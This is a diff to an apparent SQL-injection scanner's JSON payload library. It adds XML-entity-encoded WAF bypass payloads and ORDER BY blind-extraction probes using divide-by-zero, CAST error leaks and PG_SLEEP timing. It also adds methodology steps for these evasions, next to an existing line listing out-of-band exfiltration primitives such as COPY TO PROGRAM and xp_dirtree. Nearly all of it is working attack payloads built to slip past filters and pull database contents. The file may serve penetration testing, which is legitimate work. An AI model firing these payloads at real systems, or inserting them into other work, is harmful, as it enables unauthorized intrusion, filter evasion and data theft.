@@ -268,7 +268,7 @@
       ]
     },
     "waf_bypass": {
-      "description": "WAF bypass SQL injection payloads \u2014 MySQL version comments, URL-encoded keywords from HackTricks",
+      "description": "WAF bypass SQL injection payloads \u2014 MySQL version comments, URL-encoded keywords from HackTricks, and XML numeric-character-reference encoding for XML-body-borne injection points",
       "tech_match": [
         "MySQL",
         "Apache",
@@ -356,6 +356,131 @@
           ],
           "severity": "high",
           "confidence_boost": 40
+        },
+        {
+          "payload": "{{baseline}} &#65;&#78;&#68; &#69;&#88;&#84;&#82;&#65;&#67;&#84;&#86;&#65;&#76;&#85;&#69;(1,&#67;&#79;&#78;&#67;&#65;&#84;(0x7e,(&#83;&#69;&#76;&#69;&#67;&#84; version())))-- -",
+          "description": "XML decimal-entity WAF bypass: the injected value sits inside an XML request body (delivery vector \u2014 see xml_injection.json contexts) so the WAF inspects the raw bytes and never sees the keywords AND / EXTRACTVALUE / CONCAT / SELECT \u2014 each is written as decimal numeric character references (&#65;&#78;&#68; = AND, &#83;&#69;&#76;&#69;&#67;&#84; = SELECT). The XML parser decodes the entities before the value reaches the DB, so the EXTRACTVALUE XPATH error still leaks version(). Requires an XML-body-borne injection point.",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "XPATH syntax",
+                "xpath syntax"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} &#x41;&#x4e;&#x44; &#x53;&#x4c;&#x45;&#x45;&#x50;(5)-- -",
+          "description": "XML hex-entity WAF bypass, time-based oracle: AND SLEEP(5) with keywords written as hexadecimal numeric character references (&#x41;&#x4e;&#x44; = AND, &#x53;&#x4c;&#x45;&#x45;&#x50; = SLEEP). Same mechanism as the decimal form \u2014 WAF byte-matching misses the encoded keywords, the XML parser decodes them before the DB parses the query. Requires an XML-body-borne injection point (xml_injection.json is the delivery vector); confirmed by the >=5s response delay.",
+          "matchers": [
+            {
+              "type": "timing",
+              "min_ms": 4500
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}&#x27; &#x4f;&#x52; &#x31;&#x3d;&#x31;-- -",
+          "description": "XML hex-entity WAF bypass, boolean form: a single quote (&#x27;) plus OR 1=1 (&#x4f;&#x52; &#x31;&#x3d;&#x31;) hex-encoded so the quote and keyword never appear literally in the inspected bytes. Result-set expansion vs baseline confirms. Delivery vector is an XML request body (xml_injection.json); the XML parser resolves the character references before the SQL engine parses the statement.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 200
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        }
+      ]
+    },
+    "order_by_sink": {
+      "description": "Blind extraction via the ORDER BY / GROUP BY clause as the injection SINK (not column-count enumeration). Applies when the input lands directly inside ORDER BY so quote-breaking and UNION are unavailable — you cannot escape the clause, but you can substitute an expression that branches on a condition. Oracle forms: boolean-blind via a CASE that divides by zero on one branch (visible error only when the branch is taken), error-based CAST of a subselect to int, and time-based PG_SLEEP / SLEEP.",
+      "tech_match": [
+        "PostgreSQL",
+        "MySQL",
+        "MSSQL",
+        "Oracle"
+      ],
+      "param_match": [
+        "sort",
+        "order",
+        "orderby",
+        "order_by",
+        "sort_by",
+        "sort_order",
+        "dir",
+        "direction",
+        "column",
+        "col"
+      ],
+      "probes": [
+        {
+          "payload": "{{baseline}},(SELECT CASE WHEN (1=2) THEN 1 ELSE 1/(SELECT 0) END)",
+          "description": "ORDER BY boolean-blind oracle via division-by-zero: the CASE expression evaluates 1/(SELECT 0) whenever the condition is FALSE, forcing a divide-by-zero DB error. Swap 1=2 for the real condition (e.g. (SELECT SUBSTRING(version(),1,1))='1') — an error means the ELSE branch ran (condition false), a clean sort means the THEN branch ran (condition true). Confirms the ORDER BY sink is injectable when UNION/quote-break are impossible.",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "division by zero",
+                "Division by 0",
+                "divide by zero",
+                "divisor is equal to zero",
+                "ORA-01476"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}},CAST((SELECT version()) AS int)",
+          "description": "ORDER BY error-based extraction via CAST: casting a text subselect to integer fails and the DB echoes the offending value in the error. PostgreSQL: 'invalid input syntax for type integer'; MSSQL variant is CONVERT(int,(SELECT @@version)) -> 'Conversion failed'. Leaks version() through the type-mismatch error message.",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "invalid input syntax for",
+                "invalid input syntax for type integer",
+                "conversion failed",
+                "Conversion failed",
+                "cannot be cast"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}},(SELECT 1 FROM PG_SLEEP(5))",
+          "description": "ORDER BY time-based oracle (PostgreSQL): a subselect over PG_SLEEP(5) in the ORDER BY clause delays the response by >=5s. MySQL form is ,(SELECT SLEEP(5)); MSSQL uses ,1;WAITFOR DELAY '0:0:5'--. Wrap in a CASE (PG_SLEEP fired only on the true branch) to turn it into a per-bit blind extraction. Last-resort oracle when no error or content differential is available.",
+          "matchers": [
+            {
+              "type": "timing",
+              "min_ms": 4500
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
         }
       ]
     },
@@ -431,6 +556,8 @@
     "5. BLIND EXTRACTION: Use SUBSTRING(value,pos,1) with binary search on ASCII values. For time-based, calibrate delay against baseline latency (+2s minimum delta).",
     "6. WAF BYPASS CHAIN: Try in order \u2014 inline comments (/*!50000 SELECT*/), case variation (sElEcT), whitespace alternatives (/**/ or %0a), double encoding (%2527), concat char-by-char (CHAR(83)+CHAR(69)...).",
     "7. FILTER EVASION: If quotes blocked, use hex (0x61646D696E), CHAR(), or numeric comparison. If spaces blocked, use /**/ or %09 (tab). If keywords blocked, use synonyms (COALESCE vs IF, CASE vs IIF).",
-    "8. OOB EXFILTRATION: MySQL LOAD_FILE+INTO OUTFILE, MSSQL xp_dirtree/xp_fileexist to UNC path, PostgreSQL COPY TO PROGRAM, Oracle UTL_HTTP.REQUEST."
+    "8. OOB EXFILTRATION: MySQL LOAD_FILE+INTO OUTFILE, MSSQL xp_dirtree/xp_fileexist to UNC path, PostgreSQL COPY TO PROGRAM, Oracle UTL_HTTP.REQUEST.",
+    "9. XML-ENTITY WAF BYPASS: when the injection point is inside an XML request body (delivery vector: xml_injection.json contexts), encode SQL keywords as decimal (&#83;&#69;&#76;&#69;&#67;&#84; = SELECT) or hex (&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;) numeric character references. A WAF inspecting raw bytes never sees the keyword; the XML parser decodes the entities before the value reaches the DB. Encode only the keywords (SELECT/UNION/AND/OR/SLEEP/quote) — the rest can stay literal.",
+    "10. ORDER BY SINK: when input lands directly in ORDER BY you cannot quote-break or UNION. Substitute a branching expression instead — CASE WHEN (cond) THEN 1 ELSE 1/(SELECT 0) END (boolean-blind via divide-by-zero error), CAST((SELECT ...) AS int) (error-based), or (SELECT 1 FROM PG_SLEEP(5)) (time-based). See the order_by_sink context."
   ]
 }
